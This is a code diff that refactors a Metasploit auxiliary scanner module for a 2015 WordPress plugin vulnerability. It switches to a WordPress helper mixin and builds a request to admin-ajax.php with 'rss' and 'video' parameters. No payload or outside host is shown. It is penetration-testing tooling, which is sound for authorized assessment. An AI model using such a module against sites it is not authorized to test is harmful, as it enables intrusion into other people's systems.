@@ -7,7 +7,7 @@ require 'msf/core'
 
 class Metasploit4 < Msf::Auxiliary
 
-  include Msf::Exploit::Remote::HttpClient
+  include Msf::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
@@ -31,10 +31,6 @@ class Metasploit4 < Msf::Auxiliary
           [ 'WPVDB', '7793' ]
         ],
       'DisclosureDate' => 'Feb 24 2015'))
-
-    register_options([
-      OptString.new('TARGETURI', [true, 'Target URI of the Wordpress instance', '/'])
-    ], self.class)
   end
 
   def run_host(ip)
@@ -45,7 +41,7 @@ class Metasploit4 < Msf::Auxiliary
     vprint_status("#{peer} - Checking host")
 
     res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
+      'uri'       => wordpress_url_admin_ajax,
       'vars_get' => {
         'action' => 'rss',
         'type' => 'video',
